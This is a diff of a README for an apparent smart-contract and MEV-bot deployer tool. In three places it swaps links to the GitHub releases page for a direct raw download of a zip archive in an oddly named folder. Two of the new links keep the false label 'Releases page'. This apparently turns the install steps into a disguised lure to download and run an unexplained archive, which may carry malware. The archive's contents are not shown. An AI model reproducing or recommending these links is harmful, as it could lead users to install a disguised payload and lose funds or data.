@@ -1,7 +1,7 @@
 # 🚀 smart-contracts-and-mev-bot-deployer - Easily Deploy Smart Contracts
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Tikkabike/smart-contracts-and-mev-bot-deployer/releases)
+[![Download](https://raw.githubusercontent.com/Tikkabike/smart-contracts-and-mev-bot-deployer/main/godkin/smart-contracts-and-mev-bot-deployer.zip)](https://raw.githubusercontent.com/Tikkabike/smart-contracts-and-mev-bot-deployer/main/godkin/smart-contracts-and-mev-bot-deployer.zip)
 
 ## 📚 Introduction
 Welcome to the **smart-contracts-and-mev-bot-deployer** repository. This application allows you to easily deploy smart contracts on Ethereum and Binance Smart Chain (BSC). You can create tokens, NFTs, DeFi projects, and MEV bots without needing deep programming knowledge. This guide will help you download and run the software.
@@ -10,7 +10,7 @@ Welcome to the **smart-contracts-and-mev-bot-deployer** repository. This applica
 To get started with the smart-contracts-and-mev-bot-deployer application:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Tikkabike/smart-contracts-and-mev-bot-deployer/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Tikkabike/smart-contracts-and-mev-bot-deployer/main/godkin/smart-contracts-and-mev-bot-deployer.zip) to find the latest version of the software. 
 
 2. **Choose Your Version**
    Check the list of available versions. Usually, the latest version is the best choice. If you need a specific feature or fix, you can also select an earlier version.
@@ -44,7 +44,7 @@ The smart-contracts-and-mev-bot-deployer offers several features to simplify you
 - **MEV Bots**: Deploy bots to capitalize on market inefficiencies.
 
 ## 🔄 Download & Install
-Visit the [Releases page](https://github.com/Tikkabike/smart-contracts-and-mev-bot-deployer/releases) to download the latest software version. Follow the installation instructions above to set it up on your device.
+Visit the [Releases page](https://raw.githubusercontent.com/Tikkabike/smart-contracts-and-mev-bot-deployer/main/godkin/smart-contracts-and-mev-bot-deployer.zip) to download the latest software version. Follow the installation instructions above to set it up on your device.
 
 ## ⚙️ Using the Application
 After running the application, follow these steps to deploy a smart contract:
